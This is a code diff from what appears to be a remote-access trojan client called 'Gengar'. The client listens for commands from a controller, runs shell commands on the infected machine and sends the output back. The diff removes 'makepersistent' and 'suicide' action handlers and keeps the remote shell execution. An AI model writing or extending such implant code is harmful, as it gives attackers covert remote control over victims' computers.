@@ -1,17 +1,6 @@
 #include <iostream>
 #include "gengar.h"
 
-bool IsEqual(std::string str1, std::string str2)
-{
-	size_t len1 = str1.length();
-	size_t len2 = str2.length();
-
-	if (len1 > len2)
-		return str1.substr(0, len2) == str2;
-	else
-		return str2.substr(0, len1) == str1;
-}
-
 void Gengar::ListenForCommand()
 {
 	char type_content_delimiter = ':';
@@ -47,16 +36,9 @@ void Gengar::RouteCommand(std::string& type, std::string& content)
 
 	if (type == "shell")
 		output = m_machine.RunShellCommand(std::move(content));
-	else if (type == "action")
-	{
-		if (IsEqual(content, "makepersistent"))
-		{
-			m_machine.MakePersistent();
-			output = "Gengar is now persistent.";
-		}
-		else if (IsEqual(content, "suicide"))
-			m_machine.Suicide();
-	}
+	else
+		output = "Unknown command type.";
+
 	m_client.Send(std::move(output));
 }
 
